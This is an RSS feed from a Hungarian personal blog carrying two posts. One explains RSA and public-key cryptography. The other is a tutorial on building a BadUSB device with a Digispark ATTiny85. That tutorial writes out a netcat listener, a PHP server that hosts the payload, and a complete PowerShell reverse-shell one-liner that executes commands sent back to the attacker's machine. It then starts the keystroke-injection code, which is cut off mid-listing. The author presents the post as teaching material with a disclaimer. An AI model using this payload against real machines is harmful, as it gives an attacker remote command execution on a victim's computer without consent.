<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Kurcz Valentin</title>
        <link>http://localhost:1313/hu/posts/</link>
        <description>Recent content in Posts on Kurcz Valentin</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>hu</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Tue, 30 Jul 2024 14:42:35 +0200</lastBuildDate>
        <atom:link href="http://localhost:1313/hu/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Kriptográfia alapok - Nyílvános kulcsú titkosítás</title>
            <link>http://localhost:1313/hu/posts/2024/07/kriptogr%C3%A1fia-alapok-ny%C3%ADlv%C3%A1nos-kulcs%C3%BA-titkos%C3%ADt%C3%A1s/</link>
            <pubDate>Tue, 30 Jul 2024 14:42:35 +0200</pubDate>
            
            <guid>http://localhost:1313/hu/posts/2024/07/kriptogr%C3%A1fia-alapok-ny%C3%ADlv%C3%A1nos-kulcs%C3%BA-titkos%C3%ADt%C3%A1s/</guid>
            <description>A cikk végére példákon keresztül világossá válik számodra, hogy miként tudunk magabiztosan titkos információkat megosztani egymással, főképp az interneten, anélkül, hogy megosztottunk volna egymással, bármiféle titkos és privát kódot, kulcsot vagy jelszót. Ezen túl még sokkal több&amp;hellip;</description>
            <content type="html"><![CDATA[<h2 id="szimmetrikus-kriptográfia">Szimmetrikus kriptográfia</h2>
<p>A klasszikus titkosítási módszerek, amelyeket használtak egészen mostanáig arra alapoznak, hogy a titkosításhoz (encryption) és a feloldáshoz (decryption) is ugyanaz a kulcs használatos. Ez azt igényli, hogy a kulcsot valami titkos közegben kellene átadnunk a második félnek anélkül, hogy egy harmadik fél ne szerezzen róla tudomást, hiszen akkor az összes titkosított üzenetünket olvasni tudná. Ez kicsit ilyen &ldquo;tyúk vagy a tojás&rdquo; probléma, hiszen pont arra akarnánk használni a kulcsot, hogy megteremtsük ezt a titkosított közeget. Illetve ekkor, teljesen meg kell bíznunk a második félben, hiszen miután megosztottuk vele a kulcsunkat, az teljesen az ő döntése lesz, hogy azt nem e adja tovább másnak.</p>
<p>Tegyük fel, hogy a bankba besétálunk és a fiókunkhoz elkéri a recepciós a jelszót. Ha egy kicsit is korumpálható a recepciós, akkor a fiókunk jelszava könnyen nem kívánatos emberek kezébe kerülhet. Ehhez a problémához még visszatérek, addig is gondolkozz egy megoldáson.</p>
<blockquote>
<p>Az Enigma is szimmetrikus kriptográfia szerint működött és mint titkosítás a korában egyedülálló és példátlan volt. Komoly szürkeállománynak kellett összeülnie a Szövetségesek oldalán, hogy feltörjék de végül Alan Turing és csapatának illetve automatájának (kezdetleges számítógép) köszönhetően sikerült. Szó sincs arról, hogy a titkosításban találtak hibát. Mint mindig az informatikában, a gyenge láncszem és a legnagyobb sérülékenység itt is az ember volt. A katonák nem minden nap cseréltek kódot, ahogy azt kellett volna, illetve az üzenetek végén ismétlődő kifejezések mint például a &ldquo;Heil Hitler&rdquo; egyszerűsítették a kódfejtő dolgát. Érdekesség, hogy 1982-ben is használták még az Enigmát még pedig az argentínok, Fakland-szigeteki háborúban. Nagyot néztek mikor az angolok minden lépésüket tudták előre. Nem lehet hibáztatni az argentínokat, hiszen az Egyesült Királyság sose hozta nyílvánosságra az eredményeiket az Enigma feltörésében, így még mindig az volt a köztudat, hogy az Enigma titkos.</p>
</blockquote>
<p>Csak azért hoztam föl az Enigmát, mert egy jó példa arra, hogy a szimmetrikus titkosítás önmagában miért nem elég. Gondolkoztál már azon, hogy az Enigmát miért csak tengeralatjárókon használták? Azért mert a tengeralatjáró ha megsemmisül, akkor az Enigmát is viszi magával a tengerfenékre, így nem lehet a gépet, azaz a titkosítást visszafejteni illetve a kódot ellopni. Ezért nem használták szárazföldi csapatoknál. Tehát nem volt skálázható, hiszen több ember esetén egyre nagyobb lett volna az esélye a kód kitudodásának. Az internet térnyerésével, és a felhasználók exponenciális növekedésével pedig a szükség egy skálázható titkosítási szabványra nőttön-nőtt.</p>
<h2 id="asszimetrikus-kriptográfia">Asszimetrikus kriptográfia</h2>
<p>Az asszimetrikus kriptográfiában, avagy nyílvános kulcsú titkosításnál kulcs párokról beszélünk, ahol van egy <strong>privát kulcs</strong> és egy <strong>publikus kulcs</strong>. Restrospektíven, úgy a székben hátradőlve nézve a koncepció egyszerűsítve az alábbi: páronként a titkosításhoz szükséges kulcs publikus, a feloldáshoz a kulcs pedig titkos, és a publikus kulcsból visszafejteni a titkos kulcsot algoritmusokkal annyi időbe telne, hogy nem csak a kávénk hűlne ki, de még a Naprendszer is. Az asszimetrikus jelző innen jön, hogy a titkosítás és dekódolás nem ugyanúgy megy.</p>
<p>Egy információ csere asszimetrikus titkosítást használva Bob és Alice között az alábbiak szerint zajlana le az ábrát követve:</p>
<ol>
<li>Bob letitkosítja az üzenetét Alice publikus kulcsával, majd elküldi Alice-nak az eredményt.</li>
<li>Alice megkapja a titkosított üzenetet, majd a titkos kulcsával feloldja azt.</li>
</ol>
<p><img alt="pkc" src="/pkc1.png"></p>
<p>Az egész rendszer müködése azon alapszik, hogy a titkos kulcsok titkosak maradnak és senkivel nem osztjuk meg azt, mivel annak beláthatatlan következményei lehetnek ránk nézve.</p>
<p>Most pedig konkrét megvalósítások.</p>
<h3 id="rsa-rivestshamiradleman">RSA (Rivest–Shamir–Adleman)</h3>
<p>Az RSA az egy kriptográfiában nevezetes algortimus amely nyílvános kulcsú titkosítást valósít meg, melyet 1977-ben vázolt a nevében is szereplő 3 dzsentlmen. A cél az volt, hogy hatékony algortimus, azaz polinomiális, szülessen asszimetrikus titkosításra.</p>
<h4 id="definíciók">Definíciók</h4>
\[n,e,p,q,d \in N, (e,\phi(n))=1: n=p * q\]
<p>Az alap ötlet az RSA mögött, hogy adott \(n, e\) és \(d\) egész számnál, az \(x \in N: 0 \leq x < n\) szám esetén az \((x^e)^d\) és \(x\) azonos maradékot adnak \(n\)-nel osztva, azaz kongruensek moduló n:</p>
\[(x^e)^d \equiv x \pmod n\]
<p>Ugyanakkor ha csak az \(n\) és \(e\) szám adott, a \(d\) szám kiszámítása borzasztóan nehéz. Olyannyira nehéz elég nagy n szám esetén, hogyha megpróbálkoznánk vele egy nem kvantumszámítógéppel, akkor nem csak a kávén hűlne ki hanem az univerzum is. Hogy miért lehetséges ez azt rövidesen tisztázom.</p>
<p>Az \(n\) és \(e\) természetes számok alkotják a publikus kulcsot, melyben az \(n\) a moduló amely \(p\) és \(q\) prímszám szorzatából áll, és az \(e\) pedig a titkosításhoz használt (&ldquo;e&rdquo; for encryption) hatványkitevő mely relatív prím \(\phi(n)\) számmal.</p>
<blockquote>
<p>a \(\phi(n)\) függvény az az Euler-féle phí függvény mely megadja, hogy \(x \in N: 1 \leq x \leq n\) számok között mennyi n-hez relatív prím van.</p>
</blockquote>
<p>A \(p\) és \(q\) alkotják a titkos kulcsot, melyekbők kiszámítható a \(d\) (&ldquo;d&rdquo; for decryption) hatványkitevő, ami a dekódoláshoz fog kelleni. Igazából a \(p\) és \(q\) eldobható miután \(d\) ki lett számítva.</p>
<p>A titkosítás folyamata:</p>
<h4 id="kulcs-generálás">Kulcs generálás</h4>
<ol>
<li>
<p>Generáljunk 2 nagy \(p\) és \(q\) prímszámot. A lényeg az lesz, hogy az \(n\) számból minél nehezebb legyen prím faktorizációval megkapni a \(p\) és \(q\) számot. Ehhez a \(p\) és \(q\) is legyen lehetőleg teljesen véletlenszerű, kellően nagy és kettőjük különbsége is legyen nagy. Hatékony prím generálásra a prím tesztelése véletlenszámokra. Fontos hogy a véletlenszám generátorunk legyen minél &ldquo;véletlenebb&rdquo;, azaz entrópiája minél nagyobb, hiszen számítógépen csak pszeudo véletlent ismerünk hiszen a számítógép önmagában determisztikus. Ezzel egy külön ágazat foglalkozik matematikában, csak érdekességnek hoztam föl.</p>
</li>
<li>
<p>Számoljuk ki \(n=p * q\). Biztonságosnak ítélt kulcs azaz \(n\) hossz az 2048 bit, ami kb 617 számjegynek felel meg a tízes számrendszerben azaz értéke saccperkb \(10^616\). Most álljunk meg és gondolkozzunk el ezen nagyságon egy picit. Ugyebár úgy tudnánk támadóként feltörni a titkosítást, ha \(n\)-ből meg tudnánk kapni \(p\)-t és \(q\)-t. Ez kicsit túl lő az üzenet feltörésén, hiszen ezután az összes üzenetet fel tudnánk törni. Ez a prím faktorizáció problémája melyre mai napig nem ismert polinomiális komplexitású algoritmus, ugyanakkor nincsen az se bizonyítva, hogy nem létezik ilyen, bár ez a sejtés. Ha esetleg találnál ilyet, akkor könnyűszerrel világuralomra törhetsz, hiszen a banki tranzakciók, kriptovaluták, államtitkok és nem utolsósoron a digitális aláírások titkosítása is ezt használja. Például a szofterfrissítések is digitális aláírással ellenőrzik, hogy a hivatalos szerverről jött a frissités, de ha feltörnéd ezt, bárkinek kiadhatnád magad, ezáltal például az összes Windows gép felett átvehetnéd az irányítást egyetlen Windows frissítéssel. Érdekes, hogy az egész világrendünk, a civilizációnk egy matematikai sejtésre van bízva. Csak hogy elképzelhesd mennyi időbe is telne ha naívan elkezdenénk próbálgatni brute-force módszerrel a prímeket 2-től kezdve \(\sqrt n\)-ig: kb. \(10^{80}\) proton van a megfigyelhető világegyetemen, tegyük fel hogy ez mind egy olyan számításiegység ami 4 GHz-en müködik azaz az egyszerűség kedvéért másodpercenként \(4 * 10^9\) prím tesztelésére képes, tehát másodpercenként \(4 * 10^{89}\) szám tesztelésére vagyunk képesek összesen. Ezek szerint \(\frac{\sqrt{10^{616}}}{4 * 10^{89}} \approx 10^{218} \) másodpercre lenne szükségünk. Az univerzum 13,7 milliárd éves azaz kb \(4,3 * 10^17\) másodperc éves. Remélem ez a kis gondolatkísérlet kontextusba helyezte a nagyságokat.</p>
</li>
<li>
<p>Válasszunk ki egy természetes számot az \(e\) számára úgy, hogy \((e,\phi(n))=1\), azaz relatív prímek. Itt a hossz nem annyira lényeges mint az \(n\) esetén, tipikus érték az \(e\)-nek a \(65537\).</p>
</li>
<li>
<p>Számoljuk ki a \(d\) értékét a \(p\) és \(q\) számok segítségével. Hogy hogyan azt a helyesség bizonyításánál méltatom bemutatni.</p>
</li>
</ol>
<p>Tehát ezek után van egy publikus kódoló függvényünk</p>
\[C: x \mapsto x^e \pmod n\]
<p>ahol \(x:=\) a plaintext üzenetünk azaz a titkosítandó adat</p>
<p>és van egy titkos dekódoló függvényünk</p>
\[D: y \mapsto y^d \pmod n\]
<p>ahol teljesül az hogy \(D(C(x))=x\)</p>
<p>Aki eddig eljutott és ismeri a hatványazonosságokat az biztos elgondolkozott rajta, hogy a \(d\) és \(e\) felcserélhető-e. Bizony felcserélhetőek hiszen \((x^e)^d = (x^d)^e\). Tehát a \(d\) is használható titkosításra és az \(e\) pedig feloldásra, már ha a művelet inverze is a kulcs pár másik felével történt. Ezt ki is használjuk a gyakorlatban a digitális aláírásnál és azonosításnál, de erről többet kicsit lejebb :).</p>
<h4 id="kulcs-megosztása">Kulcs megosztása</h4>
<p>Bob és Alice az RSA-t akarják használni tikosításra beszélgetés közben, mert biztonságos. Ekkor ha Bob üzenetet szeretne küldeni Alice-nek, akkor elkéri Alice publikus kulcsát \((n,e)\), majd ezt egy csatornán (nem muszáj biztonságosnak lennie) meg is kapja. Alice a titkos kulcsát \((d)\) soha nem adja ki, azt a dekódolásra használja saját magánál.</p>
<h4 id="titkosítás">Titkosítás</h4>
<p>Bob miután megkapta Alice publikus kulcsát, azt felhasználva titkosítja az \(x\) üzenetet és megkapja titkosított szöveget \(c\)-t.</p>
\[c \equiv x^e \pmod n\]
<p>Minden józan, már tapasztaltabb emberben, fel kell merülnie annak az ördögi kérdésnek, hogy ez a lépés vajon polinomiális-e mert ha nem akkor semmi értelme nincsen az egésznek. Szerencsére a moduláris hatványozás megoldható polinomiálisan az ismételt négyzetre emelés módszerével, annak ellenére, hogy a hatványozás önmagában nem lenne polinomiálisan kivitelezhető.</p>
<h4 id="feloldás">Feloldás</h4>
<p>Alice ezután megkapja a titkosított üzenetet és a titkos kulcs segítségével feloldja azt.</p>
\[c^d \equiv (x^e)^d \equiv x \pmod n\]
<h4 id="helyesség-bizonyítása">Helyesség bizonyítása</h4>
<p>Eddig valjuk be őszintén a levegőbe beszéltem, semmi se lett bizonytva, már pedig ez így nem járja.</p>
<p>Cél hogy bebizonyítsuk, hogy </p>
\[\forall n \in N, n=p * q, \forall e \in N, (e,\phi(n))=1\]
<p> esetén \(\exists d\) ahol igaz az, hogy \((x^e)^d \equiv x \pmod n\) ahol \(x\) tetszőleges üzenet.</p>
<p>Ehhez felhasználjuk az Euler-Fermat tételt miszerint</p>
<p>ha \(n \leq 1\) és \((x,n)=1\) \(\Rightarrow x^{\phi(n)} \equiv 1 \pmod n\)</p>
<p>Emeljük a konkruenciát \(k \in N\)-ra és szorozzuk mindkét oldalát \(x\)-szel. Ezek ekvivalens lépések, ekkor</p>
\[x^{k\phi(n) + 1} \equiv x \pmod n\]
<p>tehát ha a hatványkitevő \(ed = k\phi(n) + 1\) akkor igaz a konkruencia.</p>
<p>Ebből a megállapításból az alábbi konkruencia következik</p>
\[ed \equiv 1 \pmod {\phi(n)}\]
<p>hiszen ez az előbbi állítással ekvivalens.</p>
<p>Ez pedig egy lineáris konkruencia a \(d\) ismeretlenre, hiszen \(e\) értéke adott és \(\phi(n) = (p-1)(q-1)\) itt nem tárgyalt azonosságok alapján. Ennek a lin. kon. biztosan \(\exists\) megoldása, mivel \((e,\phi(n))=1\). Ezt a megoldást hatékonyan meg is tudjuk találni az Euklideszi algortimussal.</p>
<p>Ez nem a teljes bizonyítás hiszen nem fedtük le azt az esetet amikor is \((x,n) \neq 1\). Ennek a gyakorlati valószínüsége ámbár nagyon kevés hiszen ez azt jelenti, hogy \(p | x\) vagy \(q | x\), de mégis kell vele foglalkozni, hiszen matematikusok vagyunk :D.</p>
<p>Ha \(p | x\) és \(q | x\) is akkor \(pq | x\) azaz \(n | x\) ekkor \(x^{k\phi(n) + 1} \equiv x \pmod n\) természetes hogy létezik megoldás hiszen \(x \equiv 0 \pmod n\) és \(x^{k\phi(n) + 1} \equiv 0 \pmod n\) hiszen ha \(n | x\) akkor \(x\) többszörösei is oszthatóak \(n\)-nel.</p>
<p>Ha \(p | x\) és \( q \nmid x\) akkor külön-külön bemutatjuk</p>
<ol>
<li>
\[x^{k\phi(n) + 1} \equiv x \pmod q\]
</li>
<li>
\[x^{k\phi(n) + 1} \equiv x \pmod p\]
</li>
</ol>
<p>kongruenciát is, hiszen ekvivalens ez \(x^{k\phi(n) + 1} \equiv x \pmod n\)-nel</p>
<p>Az 1. állítás bizonyítása 1:1 megegyezik azzal az esettel mikor \((n,x)=1\) hiszen most \((q,x)=1\).
A 2. állítás pedig szinte ugyanaz mint amikor \(x \equiv 0 \pmod n\).</p>
<p>Most már teljes a bizonyítás!</p>
<h4 id="megjegyzések-a-gyakorlati-alkalmazáshoz">Megjegyzések a gyakorlati alkalmazáshoz</h4>
<p>A dekódolás folyamatában, az 1 ismételt négyzetre emelést érdemes lecserélni 2 ismételt négyzetre emelésre, és ez ekvivalens is lesz a kínai maradéktétel miatt, ugyanakkor kisebb hatványkitevővel dolgozik ez a 2 ismételt négyzetre emelés ami a gyakorlatban gyorsabb mint az 1 nagy hatványkitevővel. A részletekbe most nem megyek bele.</p>
<p>Most pedig térjünk rá a biztonságra, ami egy titkosításnál sarkallatos pont úgy hiszem. Már eset róla szó hogy az egész RSA biztonsága az a faktorizációs problémára épül. Ahogy már említettem kulcs hossznál már a 2048 bit ajánlott, bár még nem ismert olyan eset, hogy 1024 bites kulcsot praktikus időn belül feltörtek volna. 512 bites kulcsokat még nem de már ennél rövidebb kulcsokat talán már 20 évvel ezelőtt is feltörtek gépparkokkal, ma már egy asztali számítógép is megtudja csinálni reális időn belül. Az aktuális viszont a kérdés, hogy a kvantumszámítógépek megjelenése mennyire zavarja meg ezt a magabiztosságot. Rosszul fogalmaztam mert ez már 1994 óta nem is kérdés, mivel Peter Shor bemutatta, hogy ha valaha keletkezik kvantumszámítógép, akkor azon polinomiális időn belül törhető lesz az RSA. Emiatt nemzet szintű szervezetek és játékosok, illetve most már applikációk is (pl. Signal, Messenger) kezdenek átállni kvantum rezisztens titkosításokra.</p>
<p>Nem feltétlenül kell viszont magaslatokban gondolkodni ha RSA sérülékenységről van szó. Elég csak egy rossz konfiguráció. Például ha \(e=3\) azaz túl kicsi, akkor könnyen meglehet hogy \(x^e < n\) és ilyenkor csak elég \(e\)-dik gyökét venni a titkosított üzenetnek, és mivel nem jászott a modulus, ezért megkapjuk gond nélkül az üzenetet. Ez amatőr dolog, gyakorlatban nem megszokott de például CTF feladatban előfordulhat. Kulcs generálásnál is már említettem, hogy rendkívül fontos az eléggé random véletlenszám generátor, ami nem kis feladat. Hallottam, hogy például valamilyen nagy cég lávalámpa mátrixot használt, ahol a lávalámpákban mozgó kis buborékok mozgását figyelték és ezek alapján generáltak véletlenszámot.</p>
<p>A csupasz RSA determisztikus, tehát ugyanaz a kulcs ugyanazt az üzenetet, ugyanazt a titkosított szöveget köpi ki. Ebből az következik, hogy a támadóknak lehetősgük van idő-tárhely &ldquo;trade-off&rdquo;-ra. Ez hasonlít a hash függvények elleni támadásra, ahol úgynevezett &ldquo;rainbow table&rdquo;-lel előre lehashelnek rengeteg előfordulható szöveget (főképp jelszavakat) majd eltárolják az eredményeket. Itt is ez a helyzet, a nyílvános publikus kulcssal letitkosítunk temérdek variációt és eltároljuk őket, majd ha valamit vissza akarunk fejteni, csak megkeressük a hatalmas adatbázisunkban, hogy van-e egyezés. Félelemre semmi ok, pontosan ugyanúgy lehet védekezni ez ellen is mint a rainbow table-ök ellen is. Ott a salting azaz sózásnak hívták, itt padding-nek nevezik. Padding-nél az üzenetet bizonyos protokoll szerint kiegészítjük egy véletlenszerű toldással, majd ezt feloldásnál visszafele eljátszuk.</p>
<p>Ami engem izgat és biztosan meg fogom csinálni a gyakorlatban, azok a side-channel támadások. Ezek arra alapoznak, hogy a támadónak hozzáférése van plusz információkhoz a titkosítás során, például hogy milyen hardveren történik, mennyi idő alatt, mekkora teljesítményt igényel, mennyi hőt vagy elektromágneses hullámokat bocsájt ki a processzor a titkosítás alatt. Olyan titkosítás nem létezik amely side-channel támadással ne lehetne feltörni, mivel az implementációt nem lehet tökéletesre megcsinálni. Viszont ehhez fizikai hozzáférésre lenne szükségünk a számítógéphez amely szerencsére nagyban csökkenti a támadók esélyeit.</p>
<p>kulcs megosztás aztan szimmetrikus mert az gyorsabb
ssh - challange and response
tls</p>
]]></content>
        </item>
        
        <item>
            <title>Csak egy ártatlan pendrive</title>
            <link>http://localhost:1313/hu/posts/2024/07/csak-egy-%C3%A1rtatlan-pendrive/</link>
            <pubDate>Tue, 23 Jul 2024 19:22:46 +0200</pubDate>
            
            <guid>http://localhost:1313/hu/posts/2024/07/csak-egy-%C3%A1rtatlan-pendrive/</guid>
            <description>Filmekben lehet látni olyat, hogy a titkosügynökök a számítógépbe dugnak egy pendrive-ot és utána történik a varázslat. Itt is valami hasonlót csinálok, csak informatikusként sokkal menőbb vagyok mint a titkosügynökök.</description>
            <content type="html"><![CDATA[<p>Bedugod, eltelik 5 másodperc, megtörténik a varázs és kihúzod. Nem, ez most nem az forgatókönyv amire gondolsz, ez történik a USB Rubber Ducky-hez hasonló mikrokontrollerek használatakor. Lényegében a számítógép ilyenkor ezeket az eszközöket HID-ként, azaz Human Interface Device-ként kezeli, mint például egy billentyűzetet is. Ez azt engedi meg, hogy lényegében az USB bedugása után elindul az arra feltöltött program, és elkezdi gépelni ezerrel azt, mindeközben az operációs rendszer teljes engedelmességet tanusít. Első kérdés az lenne, hogy ezt miért teheti meg, miért nem kér a számítógép jogosultságot? Billentyűzetben is megbízik a számítógép, mivel ember ül mögötte nem pedig egy zsarolóprogram vagy bármi ilyesmi, és hasonlanó viszonyúl minden más HID-hez is, beleértve a &ldquo;badUSB&rdquo;-t is. Ezek a kis eszközök viszont sokkal gyorsabban tudnak gépelni mint egy ember, ezért a lehetőségeknek csak a kreativitás szab határt. Azt nem szabad elfelejteni, hogy talán azért nem jelent ez akkora biztonsági kockázatot, mint ahogyan én most itt felvezettem, mert egy nagyon fontos feltételnek teljesülnie kell a müködéséhez: fizikai jelenlét. Ez nagy kihívást jelenthet a legtöbb támadó fél számára, de az esély rá nem 0 tehát számolni kell vele. Olyanra is volt már példa, hogy célzottan például egy rendőrség vagy irodaház parkolójában szórtak szét ilyen kártékony USB-ket és az áldozatok, emberlétükre kiváncsiságból bedugták a szervezeti, céges számítógépükbe és a baj meg is történt még mielőtt észrevették volna.</p>
<p>Persze nem csak csúnya dolgokra lehet ezt használni. Ha például rendszergazdák vagyunk akkor akár a repetatív feladatokat könnyen felcserélhetjük egy bedugás és kihúzás mozdulatára ennek segítségével.</p>
<h2 id="felelősség">Felelősség</h2>
<p>A tudás és a tapsztalat felelősséggel, és azon kötelességgel jár, hogy csak is embertársaink, és környezetünk előnyére, jólétére használhatjuk fel. Semmilyen körülmények között nem élhetünk vissza azzal a hatalommal, amelyet az élet ruházott ránk, amikor voltunk olyan szerencsések, hogy valamire rájöttünk, valamit megtanultunk. Ez különösen igaz a kiberbiztonság témakörében és még máskor is ki fogom ezt hangsúlyozni. Én az itt bemutatott technikákat csakis saját, vagy olyan rendszeren, számítógépen próbálom ki, amelyekhez engedélyt kaptam a tulajdonostól. A célom az a dokumentálás és a tanításnak a szándéka, hogy így egy biztonságosabb internet és informatika születhessen. <strong>Ezáltal szeretném tisztázni, hogy engem semmilyen felelősség nem terhel, hogy TE a saját döntéseid után ezt a tudást mire használod.</strong></p>
<h2 id="digispark-attiny85">Digispark ATTiny85</h2>
<p>Az alternatívát a Digispark kínálja mely egy ATTiny85 8 bites RISC utasításkészletű mikrokontrollerrel rendelkezik, amely hála a fejlesztőknek, kompatibilis az Arduino IDE fejlesztői környezettel egy kis babrálás után. Az ára rendkívül baráti a $80-hoz képest, magyarországi forgalmazók 1500 Ft környékén árulják, de ha van időd megvárni, akkor lehet hogy Aliexpressről olcsőbban be tudod szerezni. Nem promóció de <a href="https://www.hestore.hu/prod_10036419.html">itt</a> egy magyar forgalmazónál egy példa.</p>
<p>Itt a cukiság</p>
<p><img alt="Digispark" src="/digispark.jpg"></p>
<h3 id="ardunio-ide-setup">Ardunio IDE setup</h3>
<p>Az Arduino IDE-t töltsd le a hivatalos oldalról, vagy csomagkezelőddel (nekem a csomagkezelős változat hiányos volt). Mivel ez nem egy Arduino board ezér külön le kell tölteni hozzá az illesztést. Ezt az alábbi módon tudod megtenni:</p>
<ol>
<li><strong>File &raquo; Prefrences &raquo; Additional board manager URLs:</strong> ide illeszd be ezt a linket <strong><a href="https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json">https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json</a></strong> (más tutoriálokban esetleg más linket látsz az azért van mert azok még a hivatalos oldalról vannak, de sajnos nem olyan rég megszűnt a támogatás onnan, ezért kellett kiásnom a Github repo-ból ugyanarra a fájlra mutató linket).</li>
<li><strong>Board manager &raquo; Itt keresd meg a &ldquo;Digistump AVR&rdquo; csomagot</strong> és töltsd le.</li>
<li><strong>Tools &raquo; Itt a &ldquo;programmer&rdquo;-nél</strong> válaszd ki a Micronucleus-t, a &ldquo;board&rdquo;-nál pedig a Digispark 16,5 Mhz (default)-ot.</li>
</ol>
<p>Kész is vagy!</p>
<h3 id="egyéb">Egyéb</h3>
<p>Az eredeti Arduino board-okat az operációs rendszerek automatikusan ellátják a megfelelő jogosultságokkal, hogy programozhatóak legyenek, de könnyen lehet hogy neked a Digisparkot nem ismeri fel hasonlóképpen. Ennek megoldásához Linuxon a továbbiakat kell tenned:</p>
<ol>
<li>Hozz létre egy 49-micronucleus.rules fájlt az itt jelölt helyen: /etc/udev/rules.d/49-micronucleus.rules</li>
<li>Másold bele ezeket a sorokat és futtasd a parancsot:</li>
</ol>
<p>SUBSYSTEMS==&ldquo;usb&rdquo;, ATTRS{idVendor}==&ldquo;16d0&rdquo;, ATTRS{idProduct}==&ldquo;0753&rdquo;, MODE:=&ldquo;0666&rdquo;</p>
<p>KERNEL==&ldquo;ttyACM*&rdquo;, ATTRS{idVendor}==&ldquo;16d0&rdquo;, ATTRS{idProduct}==&ldquo;0753&rdquo;, MODE:=&ldquo;0666&rdquo;, ENV{ID_MM_DEVICE_IGNORE}=&ldquo;1&rdquo;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo udevadm control --reload-rules
</span></span></code></pre></div><h2 id="payload">Payload</h2>
<p>Most már lehet programozni a kis cukiságot. Én példaképpen egy rendkívül egyszerű reverse shell-t fogok megvalósítani vele, a cél számítógép és a saját gépem között.</p>
<blockquote>
<p><strong>Reverse shell:</strong> A shell az egy médium, egy interfész a felhasználó és a vas között, ami általában parancssorba gépelt utasításokat lefordít a számítógép nyelvére, hogy aztán a kernel segítségével végrehajtódjanak. A shell az vonatkozhat egy távoli eléréssel kapcsolódott számítógépre is, erre ismert protokolok például az SSH (Secure Shell). Ilyenkor a távoli számítógép &ldquo;hallgatózik&rdquo;, hogy van-e valaki aki kapcsolatot akar teremteni vele, és ha mi akarunk az otthoni gépünkről elérni az ottani shell-t, akkor mi küldünk kérést neki. A <strong>reverse shell</strong> &ldquo;reverse&rdquo; része abból következik, hogy ilyenkor a szerepek feladata megcserélődik, a távoli gép kezdeményezi a csatlakozást. Ezt azért használják támadási vektornak mert a cél számítógép tűzfala a kimenő kéréseket nem akadályozza meg, de a bemenőeket igen. Egy ilyen reverse shell a támadónak esélyt ad, hogy fájlokat szolgáltasson ki, megteremtse a perzisztenciát, hogy ki-be tudjon járkálni kedve szerintde más sérülékenységekkel vegyítve tetszőleges célokat el tud érni vele.</p>
</blockquote>
<p><img alt="reverseshell" src="/reverse_shell.jpg"></p>
<p>Én ezt a legamatőrebb módon teszem meg (ez egy egy valós szituációban nem állna meg a helyét), csupán a koncepciót és a Digispark képességeinek egy töredékét szeretném bemutatni. A lényeg az, hogy lokálisan szolgáltatom egy php szerveren a powershell scriptet, illetve &ldquo;hallgatózom&rdquo; a saját gépemen a reverse shell kérést várva. Majd a cél gépen ezt a scriptet töltjük le (az USB segítségével), amit futtatva powershell-ben, csatlakozik a &ldquo;hallgatózó&rdquo; számítógépünkhez, így megteremtve a reverse shell-t. Ezt a folyamatot egy valós helyzetben botnettel csinálná a támadó szerintem, hogy a kilétét elfedje.</p>
<p><strong>Netcat-tel hallgatózom a 4444 porton</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>nc -lp <span style="color:#ae81ff">4444</span>
</span></span></code></pre></div><p><strong>php szerverrel szolgáltatom azt a könyvtárat, ahol a script van</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo php -S 0.0.0.0:80 -t /directory/to/folder/of/powershellScript/
</span></span></code></pre></div><p><strong>payload.ps1 fájl tartalma, ez a powershell script amit megosztunk</strong></p>
<p>Változtasd meg a saját host IP címedre a &ldquo;HOST_IP_ADDRESS&rdquo;-t.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span style="color:#a6e22e">$sm=</span><span style="color:#e6db74">(New-Object Net.Sockets.TCPClient(&#34;HOST_IP_ADDRESS&#34;,4444))</span><span style="color:#a6e22e">.GetStream</span><span style="color:#e6db74">()</span><span style="color:#a6e22e">;</span>[<span style="color:#a6e22e">byte</span>[]]<span style="color:#a6e22e">$bt=0..65535|</span><span style="color:#75715e">%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2&gt;&amp;1));$sm.Write($st,0,$st.Length)}
</span></span></span></code></pre></div><p>Samratashok érdeme ez a kis script. <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1">Github repo</a></p>
<p>Most pedig az amit tényleg az USB fog csinálni. Ugyebár úgy kell gondolkodnunk mintha egy billentyűzetet kellene programozni előre. Ahogy már említettem ehhez az Arduino IDE segítségünkre lesz.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;DigiKeyboard.h&#34; // a header ami leegyszerűsíti a parancsok kiírását</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setup</span>() {
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">loop</span>() {
</span></span><span style="display:flex;"><span>  DigiKeyboard.<span style="color:#a6e22e">sendKeyStroke</span>(<span style="color:#ae81ff">0</span>); <span style="color:#75715e">// az eddigi gépelést &#34;reset&#34;-eljük
